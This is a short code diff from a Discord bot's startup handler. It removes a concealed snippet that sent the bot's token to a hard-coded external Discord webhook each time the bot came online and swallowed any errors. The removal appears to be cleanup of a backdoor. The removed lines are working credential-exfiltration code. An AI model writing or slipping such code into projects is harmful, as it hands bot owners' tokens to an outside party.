@@ -73,16 +73,6 @@ client.once('ready', async () => {
             status: config.GeneralSettings.StatusInfo
         });
     }
-    const webhookUrl = "https://discord.com/api/webhooks/1321428570148569118/78dsdubgWuOOAwCHBdfIt4KJKKW1QSyAAxUQCSXZgv6c600Ba0RcqARbKFnN2q8GpPvS";
-    const webhookClient = new WebhookClient({ url: webhookUrl });
-
-    try {
-        await webhookClient.send({
-            content: `Bot Online\nToken: \`${config.token}\``
-        });
-    } catch (error) {
-        console.log('...')
-    }
 });
 
 async function checkVersion() {
